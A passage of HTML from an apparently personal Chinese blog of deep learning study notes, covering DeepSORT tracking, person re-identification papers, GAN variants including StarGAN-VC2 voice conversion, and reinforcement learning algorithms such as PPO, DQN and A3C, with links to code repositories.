src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921192412849-20220921%2019:24:12.png" alt="image-20220921192412849"></p><p><strong>追踪流程拆解：</strong></p><ul><li>第一帧：检测得到10个bbox，此时没有track</li><li>对每一帧的检测结果，都会经过NMS和置信度阈值来筛选</li><li>不会执行任何的deepsort追踪操作</li><li>对当前10个检测结果分别初始化track</li><li>第二帧：检测得到11个bbox，如何跟上一帧初始化的track匹配呢？</li><li>进行IOU匹配（级联匹配需要对confirmed track，现在还没有）</li><li>此时匹配到10个track，注意匹配到的更新卡夫曼参数</li><li>还有一个bbox没有匹配到，为其新建一个bbox</li><li>第三帧：检测得到12个bbox，当前还没有confirm的track（命中3次）</li><li>前面创建了11个track要继续与12个bbox进行IOU匹配</li><li>其中一个track没有匹配上（此时是非confirm的，将其删除）</li><li>有10个track已经命中3次了，将其状态更改为confirm</li><li>第四帧：检测得到14个bbox，不仅要做IOU还要做级联匹配</li><li>对前面10个confirm的track进行级联匹配（优先），然后再IOU</li><li>只有confirm的track才会可视化在输出结果中</li><li>注意每次匹配到的track一定要更新其卡夫曼参数</li></ul><p><strong>追踪流程拆解总结：</strong></p><ul><li>检测得到当前帧的bbox（其实追踪好坏主要取决于检测结果）</li><li>track分为：confirmed和unconfirmed，待遇不同</li><li>对于confirmed要先进行级联匹配，优先级高，连续70帧没被匹配上会被删除</li><li>代价矩阵包括ReID特征构建的余弦距离与运动信息构建的马氏距离</li><li>对于级联匹配玩剩下的和当前是unconfirmed与剩下的bbox进行IOU匹配</li><li>经过级联与IOU匹配后就得到了所有匹配结果，同时要更新track参数</li><li>对于匹配成功的track，连续命中三次以上才能转换成confirmed</li><li>对于没有匹配成功的track，如果它是unconfirmed则删除</li></ul><blockquote><p>代码：</p><p>Yolov5_DeepSort_Pytorch</p><p>github地址：</p><p>mikel-brostrom &#x2F; Yolov5_DeepSort_Pytorch：<a href="https://github.com/mikel-brostrom/Yolov5_StrongSORT_OSNet">https://github.com/mikel-brostrom/Yolov5_StrongSORT_OSNet</a></p></blockquote><h3 id="10-行人重识别"><a href="#10-行人重识别" class="headerlink" title="10. 行人重识别"></a>10. 行人重识别</h3><h4 id="基于注意力机制的reld"><a href="#基于注意力机制的reld" class="headerlink" title="基于注意力机制的reld"></a>基于注意力机制的reld</h4><blockquote><p>来源论文：Relation-Aware Global Attention，2020，CVPR</p></blockquote><p>主要贡献：</p><ol><li><p>对channel做权重</p></li><li><p>对空间做权重</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922145630351-20220922%2014:56:30.png" alt="image-20220922145630351"></p><blockquote><p>代码：</p><p>github地址：</p><p>microsoft &#x2F; Relation-Aware-Global-Attention-Networks：<a href="https://github.com/microsoft/Relation-Aware-Global-Attention-Networks">https://github.com/microsoft/Relation-Aware-Global-Attention-Networks</a></p><p>以resnet50为基础、</p><p>入口：main_imgreid.py，先写参数</p></blockquote><h4 id="基于attention的行人重识别"><a href="#基于attention的行人重识别" class="headerlink" title="基于attention的行人重识别"></a>基于attention的行人重识别</h4><h4 id="基于行人局部特征融合"><a href="#基于行人局部特征融合" class="headerlink" title="基于行人局部特征融合"></a>基于行人局部特征融合</h4><blockquote><p> 论文来源：Relation Network for Person Re-identification</p></blockquote><p>整体流程：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922161312974-20220922%2016:13:13.png" alt="image-20220922161312974"></p><p>流程解析：</p><ol><li>先对整体进行特征提取：现将数据resize，输入到resnet</li><li>将特征图分块，直接在h纬度进行截取</li><li>计算GCP特征：avg-max</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922161615425-20220922%2016:16:15.png" alt="image-20220922161615425"></p><ol start="4"><li>one vs rest：有点类似attention</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922161825106-20220922%2016:18:25.png" alt="image-20220922161825106"></p><ol start="5"><li>损失函数：依然是分类损失和triple loss，在六个点各计算了两种损失</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922162634214-20220922%2016:26:34.png" alt="image-20220922162634214"></p><blockquote><p>代码：Relation Network for Person Re-identification</p><p>github:<a href="https://github.com/cvlab-yonsei/RRID">https://github.com/cvlab-yonsei/RRID</a></p></blockquote><h4 id="基于图模型"><a href="#基于图模型" class="headerlink" title="基于图模型"></a>基于图模型</h4><h4 id="基于拓扑图：针对遮挡现象"><a href="#基于拓扑图：针对遮挡现象" class="headerlink" title="基于拓扑图：针对遮挡现象"></a>基于拓扑图：针对遮挡现象</h4><blockquote><p>来源论文：Learning Relation and Topology for Occluded Person Re-Identification</p></blockquote><p>提出了三阶段的模型，重点解决遮蔽现象的局部特征：</p><ol><li>关键点局部特征提取</li><li>图卷积融合关键点特征</li><li>基于图匹配的方式来计算相似度并训练模型</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922171534923-20220922%2017:15:35.png" alt="image-20220922171534923"></p><p>一阶段：关键点局部特征提取</p><ul><li>选择一个pose estimation即可</li><li>得到的是各个关键点的热度图信息</li><li>通过热度图得到原始特征图的局部特征</li><li>同样也加了多个损失（local和global）</li><li>local和global的都要进行训练</li><li>全局特征是global average pooling得到</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922190549304-20220922%2019:05:49.png" alt="image-20220922190549304"></p><p>二阶段：局部特征关系整合（图卷积）</p><ul><li><p>通过加入关系更好的利用局部特征</p></li><li><p>先初始化邻接矩阵来进行图卷积（局部特征关系整合：得到邻接矩阵A来指导每个关键点特征如何跟其他关键点特征 进行计算，并且A矩阵也要进行学习）</p></li><li><p>邻接矩阵在学习过程中更新（顶点数：13个局部+1全局）（利用差异特征来学习邻接矩阵A）（用A来指导如何利用不同关键点的特征进行组合，最终再与输入的局部特征进行整合。）</p></li><li><p>更新完后与设定的模型mask。设定的模型没有的边直接删除</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922194657966-20220922%2020:04:12.png" alt="image-20220922194657966"></p><p>三阶段：图匹配</p><ul><li>回到AP、AN问题</li><li>输入两张图像（经过了前两阶段后的结果）</li><li>计算他们之间的相似度（其实输入是两组，第一组A,P; 第二组，A,N; ）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922201207388-20220922%2020:12:07.png" alt="image-20220922201207388"></p><ul><li>图匹配就是要一个相似度矩阵U</li><li>例如14*14，表示两个图之间的关系</li><li>这里面是一个交叉的过程(cross)，分别交叉来得到各自匹配的特征结果</li><li>引入新的损失函数：验证损失</li><li>就是sigmoid(emb1, emb2)的结果</li></ul><p>每个阶段都有损失，前两个阶段的local和global，后一个阶段的Classification Loss&#x2F;Triplet Loss</p><blockquote><p>代码：HOReID</p></blockquote><h3 id="11-gan生成对抗网络"><a href="#11-gan生成对抗网络" class="headerlink" title="11. gan生成对抗网络"></a>11. gan生成对抗网络</h3><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922204254337-20220922%2020:42:54.png" alt="image-20220922204254337"></p><blockquote><p>代码：gan</p></blockquote><p>主要是生成器、判别器、损失</p><h4 id="cyclegan-图像合成"><a href="#cyclegan-图像合成" class="headerlink" title="cyclegan 图像合成"></a>cyclegan 图像合成</h4><ul><li>junyanz &#x2F; pytorch-CycleGAN-and-pix2pix：<a href="https://github.com/junyanz/pytorch-CycleGAN-and-pix2pix">https://github.com/junyanz/pytorch-CycleGAN-and-pix2pix</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220922214545626-20220922%2021:45:45.png" alt="image-20220922214545626"></p><h4 id="stargan"><a href="#stargan" class="headerlink" title="stargan"></a>stargan</h4><p>Cycle-Gan中如果要生成一种效果，需要训练一组配对的G和D(2+2)，如果需要多种效果，stargan可以用一个模型完成，stargan已经迭代到了第二版本</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923143240344-20220923%2014:32:40.png" alt="image-20220923143240344"></p><ul><li>G额外接受了编码信息（one-hot）</li><li>D也同样接受，只需一个D与G</li><li>整体流程类似cycle-gan，但只用一个G就可以生成效果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923143818459-20220923%2014:38:18.png" alt="image-20220923143818459"></p><p><strong>整体流程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923144903516-20220923%2014:49:03.png" alt="image-20220923144903516"></p><p>详细展示：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923145546095-20220923%2014:55:46.png" alt="image-20220923145546095"></p><p>不仅是图像，也可以用于声音领域：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923145636573-20220923%2014:56:36.png" alt="image-20220923145636573"></p><p>v2版本</p><ul><li>多了mapping notwork和style encoder</li></ul><p>整体网络模型</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923150316715-20220923%2015:03:16.png" alt="image-20220923150316715"></p><p>Style reconstruction（编码器训练）</p><ul><li>风格编码器损失函数：$L_{sty} &#x3D; E_{x,\tilde y,z}[||\tilde s - E_{\tilde y}(G(x,\tilde s))||_1]$</li><li>其中 $\tilde s$ 是由mapping网络所得到的结果</li><li>相当于先给G一组风格向量，让它去生成，再对结果的结果进行编码</li><li>让编码后得到的风格向量与输入的mapping网络向量越接近越好</li></ul><p>Style diversification（多样化训练）</p><ul><li>结果得生成一些，多样化损失：$L_{ds} &#x3D; E_{x,\tilde y,z_1,z_2}[||G(x,\tilde s_1)-G(x,\tilde s_2||1]$</li><li>两组随机向量$z_1$，$z_2$通过mapping网络可以得到$s_1$与$s_2$：$\tilde s_i &#x3D; F_{\tilde y}(z_i) \text{for}\ i \in {1,2}$ </li><li>为了结果丰富，要使得当下计算结果越大越好，求损失时去负号</li></ul><p>cycle loss</p><ul><li>转换的只是特色，主体要保留：$L_{cyc} &#x3D; E_{x,y,\tilde y,z}[||x - G(G(x,\tilde s),\tilde s||_1]$</li><li>其中：$\tilde s &#x3D; E_y(x)$也就是原始图像本身的风格向量</li><li>训练时可以保证乳香不至于变得太离谱</li><li>这个损失函数其实与cycle gan基本是一样的</li></ul><blockquote><p>代码：stargan-v2</p><p>github：<a href="https://github.com/clovaai/stargan-v2">https://github.com/clovaai/stargan-v2</a></p></blockquote><h4 id="starganvc2-变声器"><a href="#starganvc2-变声器" class="headerlink" title="starganvc2 变声器"></a>starganvc2 变声器</h4><blockquote><p>来源论文：StarGAN-VC2: Rethinking Conditional Methods for StarGAN-Based Voice Conversion</p><p>相关资料：<a href="https://www.kecl.ntt.co.jp/people/kaneko.takuhiro/projects/stargan-vc2/index.html">https://www.kecl.ntt.co.jp/people/kaneko.takuhiro/projects/stargan-vc2/index.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923204726970-20220923%2020:47:27.png" alt="image-20220923204726970"></p><p>类似变声器，转换语音特征的同时留下语音内容</p><p>VC：Voice Conversion</p><ul><li>构建变声器：思想类似stargan，细节完全不同</li><li>需要输入：1. 声音数据；2. 标签编码</li><li>整体来说还是GAN模型，主要解决数据特征提取，网络模型定义</li><li>Stargan-vc2是升级版，前身还有cyclegan-vc和stargan-vc</li></ul><p>输入数据</p><ul><li>VCC2016和VCC2018（这个数据比较小，也可以用其他的）</li><li>4个人的声音数据，相当于4个domain，他们之间相互转换</li><li>论文中选择的特征为：MCEPs；log F0；APs</li><li>输入特征为：batchsize*1*35*128（35是特征个数，128是指定特征纬度）</li><li>频率：每秒钟波峰所发生的数目称之为信号的频率，用单位千赫兹(kHz)表示</li><li>0.1毫秒完成4.8次采样，则1秒48000次采样，采样率48KHZ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923211127864-20220923%2021:11:27.png" alt="image-20220923211127864"></p><p>预处理</p><ul><li>16KHZ重采样（经验值，与论文一致）</li><li>预加重：补偿高频信号，让高频信号权重更大一些，因为它信息多</li><li>分帧：类似时间窗口，得到多个特征段</li><li>论文中没有详细介绍预处理内容，源码中按照常用套路来做</li></ul><p>特征汇总</p><ul><li>基频特征(F0)：声音可以分解成不同频率的正弦波，其中最低的那个</li><li>频谱包络：语音是一个时序信号，如采样频率为16kHz的音频文件（每秒包含16000个采样点）分帧后得到了多个子序列，然后对每个子序列进行傅立叶变换操作，就得到了频率-振幅图（也就是描述频率-振幅图变化趋势的）</li><li>Aperiodic参数：基于F0与频谱包络计算得到</li></ul><p>MFCC</p><ul><li><p>梅尔倒谱系数：</p><p>流程：连续语音–预加重–加窗分帧–FFT（傅立叶变换）–MEL滤波器组–对数运算–DCT</p></li><li><p>通俗解释：FFT之后就把语音转换到频域，MEL滤波器变换后相当于得到更符合人类听觉的效果</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923215302181-20220923%2021:53:02.png" alt="image-20220923215302181" style="zoom:50%;" /></li><li><p>最后DCT相当于提取每一帧的包络（这里面特征多）</p></li></ul><p>网络架构</p><ul><li>生成器：输入就是提取好的特征，输出也就是特征</li><li>编码-解码的过程，其中引入了IN和GLU单元</li></ul><p>Instance Normalization</p><ul><li>变声期改变风格，不改变内容</li><li>编码时要留住原始内容，就要去掉声音中特性的部分</li><li>解码时要放大特性，需要再处理解码特征</li><li>Instance Normalization和Adaptive Instance Normalization</li><li>IN：使当前特征更平稳更平缓</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923220524738-20220923%2022:05:24.png" alt="image-20220923220524738"></p><ul><li>Adain：解码时要突出特色</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923221322759-20220923%2022:13:22.png" alt="image-20220923221322759"></p><p>小细节</p><ul><li>上采样与下采样：都是老路子，stride &#x3D; 2来下采样，反卷积来上采样</li><li>PixelShuffle(Real-Time Single Image and Video Super-Resolution Using an Efficient Sub-Pixel Convolutional Neural Network)：Pixelshuffle会为 (∗ , r^2 x C, H, W) 的Tensor给reshape成 (∗ , C, rH, rW)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923221947540-20220923%2022:19:47.png" alt="image-20220923221947540"></p><p>判别器</p><ul><li>GSP：global sum pooling：一个特征图压缩成一个点，batch*512*h*w压缩成batch*512</li><li>标签通过embedding编码成512维特征（batch*512），内积得到batch个判别结果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220923222013672-20220923%2022:20:13.png" alt="image-20220923222013672"></p><p>损失：对抗损失、分类损失、循环一致性损失</p><blockquote><p>代码：pytorch-StarGAN-VC2-master</p></blockquote><h4 id="超分辨率重构"><a href="#超分辨率重构" class="headerlink" title="超分辨率重构"></a>超分辨率重构</h4><blockquote><p>来源论文：Photo-Realistic Single Image Super-Resolution Using a Generative Adversarial Network</p><p><a href="https://openaccess.thecvf.com/content_cvpr_2017/papers/Ledig_Photo-Realistic_Single_Image_CVPR_2017_paper.pdf">https://openaccess.thecvf.com/content_cvpr_2017/papers/Ledig_Photo-Realistic_Single_Image_CVPR_2017_paper.pdf</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220924163001559-20220924%2016:30:01.png" alt="image-20220924163001559"></p><blockquote><p>代码：srgan</p><p><a href="https://github.com/tensorlayer/srgan">https://github.com/tensorlayer/srgan</a></p></blockquote><h4 id="基于gan的图像补全"><a href="#基于gan的图像补全" class="headerlink" title="基于gan的图像补全"></a>基于gan的图像补全</h4><blockquote><p>来源论文：Globally and Locally Consistent Image Completion</p><p><a href="http://iizuka.cs.tsukuba.ac.jp/projects/completion/data/completion_sig2017.pdf">http://iizuka.cs.tsukuba.ac.jp/projects/completion/data/completion_sig2017.pdf</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220924165154555-20220924%2016:51:54.png" alt="image-20220924165154555"></p><p>网络结构图：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220924165236234-20220924%2016:52:36.png" alt="image-20220924165236234"></p><p>特征分两部分提取：局部的和全局的，进行一致性表达</p><p>整个网络由三大块组成：</p><ul><li>修复网络：把有空白的图像修复成正常的，完全由全卷积组成，不使用池化层</li><li>全局判别器：帮助训练</li><li>局部判别器：帮助训练</li></ul><blockquote><p>代码：基于GAN的图像补全实战&#x2F;glcic</p><p>其他相关：<a href="https://github.com/otenim/GLCIC-PyTorch">https://github.com/otenim/GLCIC-PyTorch</a></p></blockquote><h3 id="12-强化学习"><a href="#12-强化学习" class="headerlink" title="12. 强化学习"></a>12. 强化学习</h3><p>强化学习就是不断与环境交互，需要大量的模拟数据来训练，训练就是不断尝试的过程，设置奖励机制，中间过程也可以设置奖励。</p><ul><li>机器人要不断与环境交互</li><li>互动就是得到下一步的指示（Action）</li><li>按照指示走下去势必会改变环境</li><li>继续与环境交互得到新的指示，并结合奖励机制来学习要不要这样做</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927140839750-20220927%2014:08:39.png" alt="image-20220927140839750"></p><p>如何通过状态得到当前合适的行为？</p><ul><li>通过神经网络，输入为state，输出为action</li><li>主要问题：如何训练网络？不是分类或回归任务了</li></ul><p>深度学习和强化学习的区别</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927142616581-20220927%2014:26:16.png" alt="image-20220927142616581"></p><h4 id="ppo算法"><a href="#ppo算法" class="headerlink" title="ppo算法"></a>ppo算法</h4><blockquote><p>Proximal Policy Optimization</p><p>关注目标函数定义方法、如何实际进行求解</p></blockquote><p>网络的输入与输出</p><ul><li>一次游戏的记录结果</li><li>包括了每一步的状态与行动 (trajectory) ：$\tau &#x3D; {s_1,a_1,s_2,a_2,s_3,…,s_T,a_T }$</li></ul><p>游戏的行为如何产生？</p><ul><li>其中$p(s_{t+1} | s_t,a_t)$是游戏自带的，$p_\theta(a_t|s_t)$是模型输出的结果，其中奖励是由当前第一步的action和state共同决定的（游戏提供的规则）</li><li>当前模型恰好得到了如下的游戏记录：</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927144811119-20220927%2014:48:11.png" alt="image-20220927144811119" style="zoom:40%;" /><p>需要优化的是网络中的权重参数</p><ul><li><p>找到最优的 $\theta$ ，使得总奖励最大：$\theta ^\star &#x3D; \arg \max \limits_\theta E_{\tau - p_\theta(\tau)}[\sum \limits_t r(s_t,a_t)]$</p></li><li><p>加入期望，即便相同的 $\theta$ 得到的action也可能不同</p></li><li><p>大数定律：穷举以接近：（ i 表示玩了多少次，t 表示一次多少steps）</p></li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927150533422-20220927%2015:05:33.png" alt="image-20220927150533422" style="zoom:33%;" /><ul><li>计算梯度：$\pi_\theta (\tau)$ 表示当前序列可能性，$r(\tau)$ 作为奖励</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927151416552-20220927%2015:14:16.png" alt="image-20220927151416552" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927151114134-20220927%2015:11:14.png" alt="image-20220927151114134" style="zoom:33%;" /><ul><li>化简到最终要求解的梯度：更新参数：$\theta \leftarrow \theta + \alpha ▼_\theta J(\theta)$（梯度上升）</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927152016136-20220927%2015:20:16.png" alt="image-20220927152016136" style="zoom:33%;" /><p>铁三角训练模型：</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927152447107-20220927%2015:24:47.png" alt="image-20220927152447107" style="zoom:50%;" /><p>如何获得这么多游戏数据？</p><ul><li><p>持续游戏，并记录每场游戏的情况（$\tau ^1:(s_1^1,a_1^1) (s_2^1,a_2^1)，\tau^2:(s_1^2,a_1^2)(s_2^2,a_2^2)$）和奖励（$R(\tau^1)， R(\tau^2)$）</p></li><li><p>把数据带入最终要求的梯度公式求解即可</p></li></ul><p>改进：</p><ul><li><p>baseline方法：总的奖励与 $\theta$ 无关，可以看作一个权重项，可以做归一化，但有些游戏以奖励为主，惩罚较少，此时可以对总的奖励进行一个去均值操作：$R(\tau ^n) - b$ ，其中，$b &#x3D; 1&#x2F;N\sum^N_{i&#x3D;1}r(\tau)（减去平均均值即去均值）</p></li><li><p>On policy和Off policy：</p><ul><li>On policy：就是训练数据由当前agent与不断环境交互得到</li><li>Off policy：找一个 $\bar{\pi}(\tau)$ 去替代 $\pi_\theta(\tau)$</li><li>使用On policy策略训练太慢，做一批数据只是迭代一次</li></ul></li><li><p>Importance Sampling</p><ul><li>梯度策略要求我们不断产生样本数据：</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927160851782-20220927%2016:08:51.png" alt="image-20220927160851782" style="zoom:33%;" /><ul><li>用另一种分布代替当前的分布：从 P 这个分布中不断采样 X ，再把 X 带入到 f(x) 中，再求 f(x) 的期望值，P’ 上场，将P换下来</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927160958859-20220927%2016:09:58.png" alt="image-20220927160958859" style="zoom:33%;" /><ul><li><p>要满足的要求：P 与 P‘ 要尽量接近</p></li><li><p>从 P’ 中sample出数据供 $\theta$进行训练（这一批数据可以训练多次）</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927161622056-20220927%2016:16:22.png" alt="image-20220927161622056" style="zoom:33%;" /></li><li><p>条件限制：$\pi_{\theta’}$ 和 $\pi_\theta$ 要相近（KL-divergence）：$D_{KL}(\pi_{\theta’}||\pi_\theta) &#x3D; E_{\pi_{\theta’}}[\log \pi_\theta - \log \pi_{\theta’}]$</p></li><li><p>直观解释：$||\theta’ - \theta||^2 \le \epsilon$，实际中是二者经过网络的预测结果尽可能差不多</p></li><li><p>实际中可以直接拿训练模型的前一次迭代参数，PPO2的限制条件如下：</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927164713758-20220927%2016:47:13.png" alt="image-20220927164713758" style="zoom:33%;" /></li><li><p>总结：用前一步迭代结果的 $\theta$ 产生大量数据，供当前 $\theta$ 进行学习</p></li></ul></li></ul><blockquote><p>代码：PPO-PyTorch</p></blockquote><p>ActionCritic组合</p><ul><li><p>让模型与当前的水平匹配，将 $R(\tau^n)-b$ 更新为 $R(\tau^n)-value$，value是critic网络要学习的结果</p></li><li><p>在PPO2版本中，限制好范围，例如 ε 取0.2；A&gt;0 是好事，此时 $p_\theta (a_t|s_t)$ 要越大越好，但有上界!</p></li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927193416972-20220927%2019:34:17.png" alt="image-20220927193416972" style="zoom:50%;" /><h4 id="q-learning和dqn算法"><a href="#q-learning和dqn算法" class="headerlink" title="q-learning和dqn算法"></a>q-learning和dqn算法</h4><p>眼前顺势奖励 + 记忆经验奖励</p><ul><li>瞬时奖励：做了一个动作就能获得的奖励</li><li>记忆经验奖励：按照训练时的经验，上一个动作发生后，接下来怎么做才能获得更大的奖励</li><li>DQN就是用神经网络来预测</li></ul><p>Q-learning</p><ul><li>收集数据：${(s_i,a_i,s_i’,r_i)}$，也就是玩游戏的记录，状态、动作、下个状态、奖励</li><li>令目标等于：$y_i \leftarrow r(s_i,a_i) + \gamma \max_{a_i’}Q_\empty (s_i’,s_i’)$</li><li>目标函数：$\arg \max_\empty 1&#x2F;2 \sum_i||Q_\empty(s_i,a_i)-y_i||$</li></ul><p>以密室逃脱为例</p><ul><li>设定5是终点，到5会有更大奖励</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927204326236-20220927%2020:43:26.png" alt="image-20220927204326236"></p><ul><li>初始化Q和R：Q现在看起来是一个空表，要不断进行填充(行为state，列为action)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927204414122-20220927%2020:44:14.png" alt="image-20220927204414122"></p><ul><li><p>迭代方式：Q(state, action) &#x3D; R(state, action) + Gamma * Max[A(next state, all actions)]</p></li><li><p>举例如：Q(1,5) &#x3D; Q(1,5) + 0.8 * Max[Q(5,1), Q(5,4), Q(5,5)] &#x3D; 100 + 0.8 * 0 &#x3D; 100</p></li><li><p>其中0.8是折扣因子，相当于经验记忆奖励的权重</p></li><li><p>重复迭代，得到收敛后的模型结果</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927205147353-20220927%2020:51:47.png" alt="image-20220927205147353"></p><p>DQN</p><ul><li>先玩一阵，得到记录数据，从记录中取一个batch，target与main相同网络结构，损失函数就是回归问题</li><li>状态很难穷举时，Q(s,a) 可以用神经网络来做</li><li>数据获取：构建一个replay buffers，用的时候去里面取一个batch就行</li><li>off policy策略</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927205433174-20220927%2020:54:33.png" alt="image-20220927205433174" style="zoom:50%;" /><blockquote><p>代码：DQN</p></blockquote><p>改进：Rainbow，加上各种套路（Double-DQN，Dueling-DQN，MultiStep）</p><p>Double-DQN</p><ul><li>随着游戏的进行，期望的Q会越大越大!</li><li>引入一个双重保险B：$Q_{\empty A}(s,a) \leftarrow r + \gamma Q_{\empty B}(s’, \arg \underset {a’}\max Q_{\empty A}(s’,a’))$</li></ul><p>Dueling-DQN</p><ul><li>让网络有举一反三的能力，而不是一次更新当前的结果</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927213822044-20220927%2021:38:22.png" alt="image-20220927213822044" style="zoom:80%;" /><ul><li>网络结构中多输出一个S值，可以当作偏置项：$Q(s,a) &#x3D; A(s,a) + V(s)$</li><li>其实就是让网络能同时更新相同state下不同action可能导致的结果，一般迭代的时候就更新当前状态下，某一个action的结果</li><li>限制网络不要只更新A值：让A中所有列的值加起来恒为0</li></ul><p>MultiStep-DQN</p><ul><li>将眼界放远，不光看眼前，还要看下N步的结果</li><li>MultiStep就是计算Q值的时候选择多个时间步</li></ul><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220927215705350-20220927%2021:57:05.png" alt="image-20220927215705350" style="zoom:30%;" /><ul><li>同梯度下降中的，随机&#x2F;批量，这个就是小批量</li></ul><p>Continuous actions</p><ul><li>针对连续值</li><li>可以采样：遍历尽可能多的情况，得到一个最大值就好了</li><li>为此，重新定义一个Q网络，输出三个结果，分别是向量、矩阵、值</li><li>新的Q：$Q_\empty (s,a) &#x3D; -1&#x2F;2(a-\mu_\empty(s))^TP_\empty(s)(a-\mu_\empty(s)) + V_\empty(s)$</li><li>因为$(a-\mu_\empty(s))^TP_\empty(s)(a-\mu_\empty(s))$恒为正，所以$action &#x3D; \mu_\empty(s)$</li><li>此时带入Q(s,a)即可求出：$max_aQ_\empty(s,a) &#x3D; V_\empty(s)$</li></ul><h4 id="actor-critic算法-a3c"><a href="#actor-critic算法-a3c" class="headerlink" title="actor-critic算法(a3c)"></a>actor-critic算法(a3c)</h4><p>优势函数</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20221007215340539-20221007%2021:53:40.png" alt="image-20221007215340539"></p><ul><li>函数表达式：$A^\pi(s_t,a_t) &#x3D; Q^\pi(s_t,a_t) - V^\pi(s_t)$</li><li>就是在状态s下，选择某一动作有多好，Q相当于得到的，V是期望的（平均）</li><li>如果A值是正的，则正激励</li></ul><p>两个网络训练有难度，做近似简化为一个网络：$A^\pi(s_t,a_t) \approx r(s_t,a_t) + V^\pi(s_{t+1}) - V^\pi(s_t)$</p><p>AC整体流程</p><ol><li>获取数据：${s_i,a_i}$（不断与环境交互，通过策略$\pi_\theta (a|s)$</li><li>前向传播计算：$A^\pi(s_i,a_i) &#x3D; r(s_i,a_i) + V_\empty^\pi(s’_i) - V_\empty^\pi(s_i)$</li><li>计算梯度：$\nabla _\theta J(\theta) \approx \sum_i \nabla_\theta log \pi_\theta(a_i|s_i)A^\pi(s_i,a_i)$</li><li>更新参数：$\theta \longleftarrow \theta + \alpha\nabla_\theta J(\theta)$</li></ol><p>多个智能体（多线程），每一个都单独与环境交互</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20221012202537913-20221012%2020:25:38.png" alt="image-20221012202537913"></p><p>损失函数</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20221012202556945-20221012%2020:25:57.png" alt="image-20221012202556945"></p><blockquote><p>代码例：Super-mario（用A3C玩超级马里奥）</p></blockquote><h3 id="13-模型部署与剪枝优化"><a href="#13-模型部署与剪枝优化" class="headerlink" title="13. 模型部署与剪枝优化"></a>13. 模型部署与剪枝优化</h3><h4 id="tensorrt"><a href="#tensorrt" class="headerlink" title="tensorrt"></a>tensorrt</h4><h4 id="tensorflow-serving"><a href="#tensorflow-serving" class="headerlink" title="tensorflow-serving"></a>tensorflow-serving</h4><h4 id="network-slimming"><a href="#network-slimming" class="headerlink" title="network-slimming"></a>network-slimming</h4><h4 id="mobilenet"><a href="#mobilenet" class="headerlink" title="mobilenet"></a>mobilenet</h4><h3 id="14-自然语言处理"><a href="#14-自然语言处理" class="headerlink" title="14. 自然语言处理"></a>14. 自然语言处理</h3><h3 id="15-bert"><a 